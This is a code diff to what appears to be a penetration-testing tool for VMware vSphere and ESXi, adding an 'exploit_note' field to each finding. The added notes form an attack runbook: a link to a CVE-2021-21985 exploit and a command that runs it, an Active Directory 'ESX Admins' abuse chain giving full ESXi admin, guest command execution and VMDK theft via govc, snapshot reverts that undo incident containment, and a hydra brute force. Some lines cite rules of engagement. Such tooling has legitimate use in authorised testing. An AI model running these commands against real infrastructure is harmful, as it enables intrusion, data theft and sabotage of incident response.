@@ -821,7 +821,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "VMSA for the fixed build); restrict the management "
                         "plane to a dedicated network.",
                         ["CWE-306", "CWE-434", "CWE-502", "CWE-787"],
-                        kind="vsphere_outdated_build"))
+                        kind="vsphere_outdated_build",
+                        exploit_note=(
+                            "Match CVE to exploit: -21985 -> github.com/"
+                            "psc4re/NSE-scripts/blob/master/CVE-2021-21985.nse; "
+                            "-34048 -> proof-of-concept only in labs; ensure "
+                            "ROE before firing."),
+                        depth_tier="t1"))
                     # A specific finding for 21985 so the exploit runbook is
                     # visible in its own row.
                     if any(c["cve"] == "CVE-2021-21985" for c in cves):
@@ -840,7 +846,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                             "Patch to the VMSA-2021-0010 fixed build; disable "
                             "the vROps plugin if unused.",
                             ["CWE-306", "CWE-502"],
-                            kind="vsphere_cve_2021_21985"))
+                            kind="vsphere_cve_2021_21985",
+                            exploit_note=(
+                                f"python3 CVE-2021-21985.py -t {h.ip}  "
+                                "# only in a lab / ROE-approved engagement; "
+                                "writes files on the appliance."),
+                            depth_tier="t1"))
                     if any(c["cve"] == "CVE-2024-37085" for c in cves):
                         out.append(_finding(
                             "critical",
@@ -861,7 +872,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                             ".esxAdminsGroup to an unused name and disable "
                             "the auto-add behaviour.",
                             ["CWE-284", "CWE-269"],
-                            kind="vsphere_cve_2024_37085"))
+                            kind="vsphere_cve_2024_37085",
+                            exploit_note=(
+                                "If AD-joined + you hold Domain Admin: "
+                                "net group 'ESX Admins' /add /domain ; "
+                                "net group 'ESX Admins' <attacker-user> "
+                                "/add /domain ; ssh <attacker-user>@"
+                                f"{h.ip}  # full ESXi admin"),
+                            depth_tier="t1"))
 
                 if pr.get("sso_domain"):
                     out.append(_finding(
@@ -873,7 +891,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "SSO domain is a design property, not a vuln — "
                         "surface it so the operator can attempt federated "
                         "logins with the appropriate UPN.",
-                        ["CWE-200"], kind="vsphere_sso_domain"))
+                        ["CWE-200"], kind="vsphere_sso_domain",
+                        exploit_note=(
+                            f"GOVC_URL='https://administrator@<sso>@{h.ip}' "
+                            "GOVC_INSECURE=1 govc about"),
+                        depth_tier="t0"))
 
                 cert = pr.get("cert") or {}
                 if cert.get("cn") or cert.get("sans"):
@@ -906,7 +928,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"@{h.ip} GOVC_INSECURE=1 govc ls -l",
                     "Rotate the compromised account; enforce MFA on SSO; "
                     "restrict the SDK to a dedicated management network.",
-                    ["CWE-287", "CWE-521"], kind="vsphere_valid_creds"))
+                    ["CWE-287", "CWE-521"], kind="vsphere_valid_creds",
+                    exploit_note=(
+                        "govc: export GOVC_URL='https://<user>@"
+                        f"{h.ip}' GOVC_INSECURE=1 GOVC_PASSWORD='<pw>'; "
+                        "govc ls -l; govc guest.run -vm <vm> -l root:<pw> id  "
+                        "# or use pyvmomi to pull VMDKs off the datastore"),
+                    depth_tier="t3"))
 
                 sessions = pr.get("sessions") or []
                 if sessions:
@@ -925,7 +953,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "govc", "govc session.ls",
                         "Rotate any account whose session is unexpected; "
                         "review admin workstation exposure.",
-                        ["CWE-200"], kind="vsphere_sessions"))
+                        ["CWE-200"], kind="vsphere_sessions",
+                        exploit_note=(
+                            "govc session.ls ; then port-scan each "
+                            "ip_address in the list for RDP/WinRM/SMB "
+                            "-- those are admin workstations"),
+                        depth_tier="t3"))
 
                 mh = pr.get("managed_hosts") or []
                 mv = pr.get("managed_vms") or []
@@ -942,7 +975,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "govc", "govc ls host ; govc ls vm",
                         "Alert on inventory reads from non-management IPs; "
                         "rotate the account used to enumerate.",
-                        ["CWE-284"], kind="vsphere_inventory"))
+                        ["CWE-284"], kind="vsphere_inventory",
+                        exploit_note=(
+                            "govc ls host ; govc ls vm ; govc host.esxcli "
+                            "-host <host> system version get ; govc "
+                            "guest.run -vm <vm> -l administrator:'' whoami"),
+                        depth_tier="t3"))
 
                 stale = _stale_snapshot_vms(mv)
                 if stale:
@@ -959,7 +997,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "Consolidate and remove stale snapshots on critical "
                         "assets (DCs, DBs, jump hosts); audit snapshot "
                         "revert operations.",
-                        ["CWE-284"], kind="vsphere_stale_snapshot"))
+                        ["CWE-284"], kind="vsphere_stale_snapshot",
+                        exploit_note=(
+                            "govc snapshot.tree -vm <critical-vm> ; govc "
+                            "snapshot.revert -vm <critical-vm> <snap>  "
+                            "# ROE-required; undoes IR containment"),
+                        depth_tier="t3"))
 
                 linked = pr.get("linked_vcenters") or []
                 if linked:
@@ -973,7 +1016,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "govc", "govc about",
                         "Apply the SSO patch level across every linked "
                         "vCenter; rotate SSO admin creds together.",
-                        ["CWE-284"], kind="vsphere_linked"))
+                        ["CWE-284"], kind="vsphere_linked",
+                        exploit_note=(
+                            "For each linked IP: GOVC_URL=https://<user>@"
+                            "<peer-ip> govc about  # confirm same creds "
+                            "work on the peer"),
+                        depth_tier="t3"))
 
                 locals_ = pr.get("local_users") or []
                 if locals_:
@@ -989,7 +1037,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "esxcli", "esxcli system account list",
                         "Set strong unique passwords on every enabled ESXi "
                         "local account; disable unused accounts.",
-                        ["CWE-521"], kind="vsphere_local_users"))
+                        ["CWE-521"], kind="vsphere_local_users",
+                        exploit_note=(
+                            "esxcli system account list ; hydra -L users.txt "
+                            "-P /usr/share/wordlists/rockyou.txt ssh://"
+                            "<esxi-ip> -t 4 -f"),
+                        depth_tier="t3"))
 
             if vami_open and p.portid != _VAMI:
                 out.append(_finding(
